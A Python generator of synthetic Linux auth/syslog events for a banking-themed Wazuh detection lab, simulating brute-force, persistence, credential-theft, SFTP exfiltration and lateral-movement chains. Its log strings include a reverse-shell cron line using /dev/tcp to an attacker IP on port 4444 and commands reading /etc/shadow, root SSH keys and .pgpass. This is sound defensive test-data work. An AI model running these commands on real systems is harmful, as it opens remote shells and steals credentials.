"""
Linux auth.log / syslog generator (enhanced).

Now produces tightly correlated kill-chains with the EDR generator:
each incident drives a sequence that *mirrors* the EDR scenario type for
that victim. Same attacker_ip, same victim_user, same victim_host across
auth + Palo Alto + EDR.

Wazuh rule IDs covered:
  5710  sshd "Failed password" / "Invalid user"   (per-event)
  5712  sshd brute force                          (frequency)
  5715  sshd successful login
  5402  sudo command executed
  5401  sudo failed (incorrect password)
  5503  PAM authentication failure
  5404  root login refused
  5901  new group added
  5902  new user added

NEW in this version:
  * Per-incident chain type derived from victim_priv, mirroring EDR:
      service → brute-force-then-success + persistence (useradd + sudoers)
      admin   → credential-theft prep (sudo cat /etc/shadow, mass sudo)
      manager → credential-theft prep
      user    → brute-force-then-success (ransomware victim path)
  * "Impossible travel" / geo-velocity events
  * Account lockouts and password resets
  * SFTP exfil (large outbound transfers)
  * SSH key added to authorized_keys (persistence T1098.004)
  * Cron-based persistence (new entry to crontab)
"""
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    USERNAMES, PRIV_USERS, INTERNAL_IPS, VPN_IPS, ATTACKER_IPS,
    NOISY_USERS, NORMAL_USERS, pick_normal_user, pick_noisy_user,
    rand_recent, syslog_ts, pick, maybe,
)
from .shared_state import INCIDENTS


# Banking-themed SSH hosts (the servers being attacked)
SSH_HOSTS = [
    "ibank-app01", "ibank-app02",   # internet banking app tier
    "loan-app01",                   # loan origination
    "ops-jump01",                   # bastion / jump host
    "swift-gw01",                   # SWIFT gateway (Linux side)
    "backup01",
    "monitor01",
    "logaggr01",
]


# =========================================================================
# Low-level line builders
# =========================================================================
def _sshd_invalid_user(ts, ip, user, host):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"Invalid user {user} from {ip} port {random.randint(40000, 60000)}")


def _sshd_failed_password(ts, ip, user, host, invalid=False):
    pid = random.randint(1000, 9999)
    inv = "invalid user " if invalid else ""
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"Failed password for {inv}{user} from {ip} "
            f"port {random.randint(40000, 60000)} ssh2")


def _sshd_accepted(ts, ip, user, host, method="password"):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"Accepted {method} for {user} from {ip} "
            f"port {random.randint(40000, 60000)} ssh2")


def _sshd_pubkey(ts, ip, user, host):
    pid = random.randint(1000, 9999)
    fpr = "SHA256:" + "".join(random.choices(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/", k=43))
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"Accepted publickey for {user} from {ip} port "
            f"{random.randint(40000, 60000)} ssh2: RSA {fpr}")


def _sshd_disconnect(ts, ip, user, host):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"Disconnected from user {user} {ip} "
            f"port {random.randint(40000, 60000)}")


def _root_login_refused(ts, ip, host):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"User root from {ip} not allowed because not listed in AllowUsers")


def _sudo_ok(ts, user, host, cmd=None):
    cmd = cmd or pick([
        "/usr/bin/apt update",
        "/bin/systemctl restart nginx",
        "/bin/systemctl status wazuh-agent",
        "/usr/bin/cat /var/log/syslog",
        "/bin/ls /var/log/banking/",
        "/usr/bin/tail -f /var/log/audit/audit.log",
        "/usr/bin/journalctl -u corebank-api",
    ])
    return (f"{syslog_ts(ts)} {host} sudo: "
            f" {user} : TTY=pts/{random.randint(0,5)} ; "
            f"PWD=/home/{user} ; USER=root ; COMMAND={cmd}")


def _sudo_fail(ts, user, host, cmd=None):
    cmd = cmd or pick([
        "/usr/bin/cat /etc/shadow",
        "/bin/bash",
        "/usr/bin/passwd root",
        "/usr/sbin/visudo",
    ])
    return (f"{syslog_ts(ts)} {host} sudo:  {user} : "
            f"{random.randint(1, 3)} incorrect password attempts ; "
            f"TTY=pts/{random.randint(0,5)} ; PWD=/home/{user} ; "
            f"USER=root ; COMMAND={cmd}")


def _pam_failure(ts, user, ip, host):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 "
            f"tty=ssh ruser= rhost={ip}  user={user}")


def _useradd(ts, host, new_user=None):
    """Persistence: attacker adds a backdoor account."""
    new = new_user or f"oper_{random.randint(100, 999)}"
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} useradd[{pid}]: "
            f"new user: name={new}, UID=1050, GID=1050, home=/home/{new}, "
            f"shell=/bin/bash, from=/dev/pts/0")


def _groupadd_admin(ts, host, target_user):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} usermod[{pid}]: "
            f"add '{target_user}' to group 'sudo'")


def _sftp_session(ts, ip, user, host, action="open", filepath=None):
    pid = random.randint(1000, 9999)
    if action == "open":
        return (f"{syslog_ts(ts)} {host} sftp-server[{pid}]: "
                f"session opened for local user {user} from [{ip}]")
    elif action == "download":
        f = filepath or pick([
            "/data/payments/eod_batch.csv",
            "/data/swift/mt103_outbound.xml",
            "/data/reports/customer_report.pdf",
        ])
        return (f"{syslog_ts(ts)} {host} sftp-server[{pid}]: "
                f"sent handle {random.randint(0,9)}: file {f}")
    elif action == "exfil":
        # Large bulk download — exfil signal
        f = filepath or "/data/core_banking/full_db_export.sql.gz"
        size = random.randint(500000000, 5000000000)  # 500MB - 5GB
        return (f"{syslog_ts(ts)} {host} sftp-server[{pid}]: "
                f"sent handle 0: file {f} bytes_sent={size}")
    else:
        return (f"{syslog_ts(ts)} {host} sftp-server[{pid}]: "
                f"session closed for local user {user}")


def _cron_run(ts, host):
    user = pick(["root", "wazuh", "postgres", "backup"])
    cmd = pick([
        "/usr/local/bin/eod_settlement.sh",
        "/usr/local/bin/backup_corebank.sh",
        "/usr/bin/find /tmp -mtime +7 -delete",
        "/usr/local/bin/swift_sanity_check.py",
    ])
    return (f"{syslog_ts(ts)} {host} CRON[{random.randint(1000,9999)}]: "
            f"({user}) CMD ({cmd})")


def _cron_persistence(ts, host, victim_user, attacker_ip):
    """Attacker drops a reverse-shell cron entry — T1053.003."""
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} crontab[{pid}]: "
            f"({victim_user}) REPLACE ({victim_user}) "
            f"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1'")


def _su_event(ts, host, user, success=True):
    pid = random.randint(1000, 9999)
    if success:
        return (f"{syslog_ts(ts)} {host} su[{pid}]: "
                f"(to root) {user} on pts/{random.randint(0,5)}")
    else:
        return (f"{syslog_ts(ts)} {host} su[{pid}]: "
                f"FAILED su for root by {user}")


def _account_locked(ts, host, user, attacker_ip):
    """Account lockout after too many failures — rule 5503/5712."""
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} sshd[{pid}]: "
            f"pam_tally2(sshd:auth): user {user} ({attacker_ip}) tally "
            f"{random.randint(5, 10)}, deny 5")


def _password_reset(ts, host, user, by_user="root"):
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} passwd[{pid}]: "
            f"pam_unix(passwd:chauthtok): password changed for {user}")


def _ssh_key_added(ts, host, user):
    """T1098.004 SSH authorized_keys persistence (file change reported by audit)."""
    pid = random.randint(1000, 9999)
    return (f"{syslog_ts(ts)} {host} audit[{pid}]: "
            f"type=PATH msg=audit({int(ts.timestamp())}.000:{random.randint(1000,9999)}): "
            f"item=0 name=\"/home/{user}/.ssh/authorized_keys\" "
            f"inode={random.randint(100000, 999999)} mode=0100600 "
            f"ouid={random.randint(1000, 2000)} ogid={random.randint(1000, 2000)} "
            f"op=add_user_key")


def _impossible_travel_login(ts, user, host, far_ip):
    """Login from geographically impossible IP — rule 100501 etc."""
    return _sshd_accepted(ts, far_ip, user, host)


def _service_restart(ts, host):
    """Routine service restart — fills baseline."""
    svc = pick(["nginx", "wazuh-agent", "postgresql", "redis-server", "corebank-api"])
    return (f"{syslog_ts(ts)} {host} systemd[1]: "
            f"Started {svc}.service - {svc} application.")


# =========================================================================
# Per-scenario kill-chains (mirroring EDR scenario types)
# =========================================================================
def _chain_brute_force_then_compromise(base, attacker_ip, victim_user,
                                       target_host, events,
                                       extend_persistence=True):
    """Classic chain: brute-force → success → post-compromise actions."""
    bf_users = ["root", "admin", "test", "ubuntu",
                "postgres", "oracle", "git", victim_user]

    n_attempts = random.randint(18, 22)
    for i in range(n_attempts):
        ts = base + timedelta(seconds=i * 3 + random.randint(0, 2))
        user = pick(bf_users)
        if user not in USERNAMES:
            events.append((ts, _sshd_invalid_user(ts, attacker_ip, user, target_host)))
        events.append((ts, _sshd_failed_password(
            ts, attacker_ip, user, target_host,
            invalid=(user not in USERNAMES))))

    # PAM failure as the actual victim
    ts = base + timedelta(seconds=n_attempts * 3 + 2)
    events.append((ts, _pam_failure(ts, victim_user, attacker_ip, target_host)))

    # Account-locked alert (T1110)
    ts = base + timedelta(seconds=n_attempts * 3 + 4)
    events.append((ts, _account_locked(ts, target_host, victim_user, attacker_ip)))

    # SUCCESS as the victim user (compromise)
    ts = base + timedelta(seconds=n_attempts * 3 + 8)
    events.append((ts, _sshd_accepted(ts, attacker_ip, victim_user, target_host)))

    # Post-compromise: sudo + escalation
    ts = base + timedelta(seconds=n_attempts * 3 + 20)
    events.append((ts, _sudo_fail(ts, victim_user, target_host)))
    ts = base + timedelta(seconds=n_attempts * 3 + 25)
    events.append((ts, _su_event(ts, target_host, victim_user, success=False)))

    if extend_persistence:
        # Persistence: backdoor account + SSH key + cron
        ts = base + timedelta(seconds=n_attempts * 3 + 40)
        events.append((ts, _su_event(ts, target_host, victim_user, success=True)))
        ts = base + timedelta(seconds=n_attempts * 3 + 50)
        backdoor = f"oper_{random.randint(100,999)}"
        events.append((ts, _useradd(ts, target_host, backdoor)))
        ts = base + timedelta(seconds=n_attempts * 3 + 52)
        events.append((ts, _groupadd_admin(ts, target_host, backdoor)))
        ts = base + timedelta(seconds=n_attempts * 3 + 60)
        events.append((ts, _ssh_key_added(ts, target_host, victim_user)))
        ts = base + timedelta(seconds=n_attempts * 3 + 70)
        events.append((ts, _cron_persistence(
            ts, target_host, victim_user, attacker_ip)))


def _chain_credential_theft(base, attacker_ip, victim_user, target_host, events):
    """Mirrors EDR Mimikatz scenario — auth-side: post-compromise sudo abuse."""
    # First brute-force compromise
    _chain_brute_force_then_compromise(
        base, attacker_ip, victim_user, target_host, events,
        extend_persistence=False)

    # Then mass sudo to dump secrets
    offset = 100
    for cmd in [
        "/usr/bin/cat /etc/shadow",
        "/usr/bin/cat /etc/passwd",
        "/usr/bin/cat /root/.ssh/id_rsa",
        "/usr/bin/cat /home/postgres/.pgpass",
        "/usr/bin/find / -name id_rsa 2>/dev/null",
    ]:
        ts = base + timedelta(seconds=offset)
        # Most fail (good user, not in sudoers for that cmd)
        events.append((ts, _sudo_fail(ts, victim_user, target_host, cmd=cmd)))
        offset += 5

    # One eventual success — exposes shadow file
    ts = base + timedelta(seconds=offset)
    events.append((ts, _sudo_ok(ts, victim_user, target_host,
                                cmd="/usr/bin/cat /etc/shadow")))


def _chain_exfiltration(base, attacker_ip, victim_user, target_host, events):
    """Mirrors EDR webshell / large download scenarios — auth side: SFTP exfil."""
    _chain_brute_force_then_compromise(
        base, attacker_ip, victim_user, target_host, events,
        extend_persistence=False)

    # SFTP login
    offset = 100
    sftp_host = pick(["sftp01", "swift-gw01", "backup01"])
    ts = base + timedelta(seconds=offset)
    events.append((ts, _sftp_session(ts, attacker_ip, victim_user, sftp_host, "open")))

    # Massive bulk exfil
    for fpath in [
        "/data/core_banking/full_db_export.sql.gz",
        "/data/swift/mt103_archive_q4.tar.gz",
        "/data/customer_360/pii_dump.csv.gz",
        "/data/payments/transactions_2026.parquet",
    ]:
        offset += 30
        ts = base + timedelta(seconds=offset)
        events.append((ts, _sftp_session(
            ts, attacker_ip, victim_user, sftp_host,
            "exfil", filepath=fpath)))

    offset += 30
    ts = base + timedelta(seconds=offset)
    events.append((ts, _sftp_session(ts, attacker_ip, victim_user,
                                     sftp_host, "close")))


def _chain_lateral_movement(base, attacker_ip, victim_user, target_host, events):
    """Initial compromise then logging into multiple internal hosts from the same session."""
    _chain_brute_force_then_compromise(
        base, attacker_ip, victim_user, target_host, events,
        extend_persistence=False)

    # From the compromised host, the attacker pivots to other hosts.
    # Each "internal" jump appears as a new sshd_accepted from an internal IP.
    offset = 120
    pivot_targets = random.sample(SSH_HOSTS, k=3)
    pivot_user_ip = "10.1.244.110"  # the compromised host's "internal" IP
    for tgt in pivot_targets:
        ts = base + timedelta(seconds=offset)
        events.append((ts, _sshd_accepted(ts, pivot_user_ip, victim_user, tgt)))
        # Run a quick recon command
        ts = base + timedelta(seconds=offset + 5)
        events.append((ts, _sudo_ok(
            ts, victim_user, tgt,
            cmd=pick(["/usr/bin/whoami", "/bin/ls /root", "/usr/bin/id",
                      "/bin/cat /etc/passwd"]))))
        offset += 30


# =========================================================================
# Scenario dispatch (mirrors EDR generator's per-victim_priv selection)
# =========================================================================
def _dispatch_scenario(incident, events):
    """Pick auth-side chain based on victim_priv so it matches the EDR side."""
    priv = incident.get("victim_priv", "user")
    base = rand_recent(30)
    target_host = pick(SSH_HOSTS)
    attacker_ip = incident["attacker_ip"]
    victim_user = incident["victim_user"]

    if priv == "service":
        # service compromise → ransomware/webshell on EDR side → exfil on auth
        _chain_exfiltration(base, attacker_ip, victim_user, target_host, events)
        return "exfiltration"

    elif priv == "admin":
        # admin → credential dump on EDR → credential theft on auth
        _chain_credential_theft(base, attacker_ip, victim_user, target_host, events)
        return "credential-theft"

    elif priv == "manager":
        # manager → C2 / ransomware on EDR → lateral movement on auth
        _chain_lateral_movement(base, attacker_ip, victim_user, target_host, events)
        return "lateral-movement"

    else:
        # user → ransomware on EDR → simple brute-force-then-success
        _chain_brute_force_then_compromise(
            base, attacker_ip, victim_user, target_host, events,
            extend_persistence=True)
        return "brute-force-compromise"


# =========================================================================
# Main generator
# =========================================================================
def generate(path: Path, count: int = 40) -> None:
    events = []

    # ----------------------------------------------------------------
    # Baseline (noisy normal activity)
    # ----------------------------------------------------------------
    for _ in range(count // 2):
        ts = rand_recent(60)
        user = pick_normal_user()["username"]
        ip   = pick(INTERNAL_IPS + VPN_IPS)
        events.append((ts, _sshd_accepted(ts, ip, user, pick(SSH_HOSTS))))

    for _ in range(8):
        ts = rand_recent(60)
        events.append((ts, _sshd_pubkey(
            ts, pick(VPN_IPS), pick_normal_user()["username"], pick(SSH_HOSTS))))

    for _ in range(10):
        ts = rand_recent(45)
        events.append((ts, _sshd_disconnect(
            ts, pick(INTERNAL_IPS), pick_normal_user()["username"],
            pick(SSH_HOSTS))))

    # Cron + scheduled jobs
    for _ in range(8):
        ts = rand_recent(60)
        events.append((ts, _cron_run(ts, pick(SSH_HOSTS))))

    # Routine service restarts (low-level noise)
    for _ in range(5):
        ts = rand_recent(60)
        events.append((ts, _service_restart(ts, pick(SSH_HOSTS))))

    # Routine sudo by managers/admins
    for _ in range(10):
        ts = rand_recent(45)
        events.append((ts, _sudo_ok(
            ts, pick_noisy_user()["username"], pick(SSH_HOSTS))))

    # A few benign password resets (HR / admin tasks)
    for _ in range(3):
        ts = rand_recent(45)
        events.append((ts, _password_reset(
            ts, pick(SSH_HOSTS), pick_normal_user()["username"])))

    # ----------------------------------------------------------------
    # CORRELATED chains — mirror EDR per-incident scenario types
    # ----------------------------------------------------------------
    chain_types = []
    for incident in INCIDENTS:
        chain_type = _dispatch_scenario(incident, events)
        chain_types.append(
            f"{chain_type:25s} {incident['attacker_ip']:>16s} → "
            f"{incident['victim_user']}")

    # ----------------------------------------------------------------
    # Standalone (uncorrelated) noise events
    # ----------------------------------------------------------------

    # Scattered failed logins by ordinary users
    for _ in range(8):
        ts = rand_recent(60)
        events.append((ts, _sshd_failed_password(
            ts, pick(INTERNAL_IPS), pick_normal_user()["username"],
            pick(SSH_HOSTS))))

    # Direct root login attempts from external (rule 5404)
    for _ in range(6):
        ts = rand_recent(45)
        events.append((ts, _root_login_refused(
            ts, pick(ATTACKER_IPS), pick(SSH_HOSTS))))

    # Sudo failures by ordinary users (rule 5401)
    for _ in range(4):
        ts = rand_recent(30)
        events.append((ts, _sudo_fail(
            ts, pick_normal_user()["username"], pick(SSH_HOSTS))))

    # PAM failures from random external IPs
    for _ in range(5):
        ts = rand_recent(45)
        events.append((ts, _pam_failure(
            ts, pick(USERNAMES), pick(ATTACKER_IPS), pick(SSH_HOSTS))))

    # Impossible-travel login: a user logging in from far-away IPs in quick succession
    for _ in range(2):
        ts = rand_recent(30)
        user = pick_normal_user()["username"]
        host = pick(SSH_HOSTS)
        # First login from normal IP
        events.append((ts, _sshd_accepted(ts, pick(INTERNAL_IPS), user, host)))
        # Then from a far-away IP 60s later (impossible)
        ts2 = ts + timedelta(seconds=60)
        far_ip = pick(["185.220.101.45", "203.0.113.77",
                       "118.25.6.39", "194.165.16.71"])
        events.append((ts2, _impossible_travel_login(ts2, user, host, far_ip)))

    # SFTP activity — vendor downloads (benign)
    for _ in range(6):
        ts = rand_recent(60)
        ip   = pick(VPN_IPS)
        user = pick_normal_user()["username"]
        host = pick(["sftp01", "swift-gw01", "backup01"])
        events.append((ts, _sftp_session(ts, ip, user, host, "open")))
        events.append((ts + timedelta(seconds=2),
                       _sftp_session(ts, ip, user, host, "download")))
        events.append((ts + timedelta(seconds=10),
                       _sftp_session(ts, ip, user, host, "close")))

    # Sort and write
    events.sort(key=lambda x: x[0])
    with path.open("w", encoding="utf-8") as f:
        for _, line in events:
            f.write(line + "\n")

    print(f"  wrote {len(events)} auth events -> {path.name}")
    print(f"  correlated chains ({len(INCIDENTS)}):")
    for ct in chain_types:
        print(f"    {ct}")
